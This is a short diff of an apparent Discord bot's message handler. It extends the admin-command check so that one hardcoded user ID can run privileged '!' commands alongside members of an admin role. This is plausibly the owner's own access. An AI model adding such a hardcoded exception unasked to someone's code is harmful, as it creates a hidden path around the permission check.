@@ -45,7 +45,7 @@ async def on_message(message):
         await link_controller.link_provider(message, pure_content)
 
         #Check the author is an Admin.
-    elif pure_content.startswith('!') and (753079844400791553 in [y.id for y in message.author.roles]):
+    elif pure_content.startswith('!') and ((753079844400791553 in [y.id for y in message.author.roles]) or message.author.id == 190974605895270400):
         text = message.content.strip()[1:].split(' ')
         command = text[0].lower()
         args = list(text[1:])
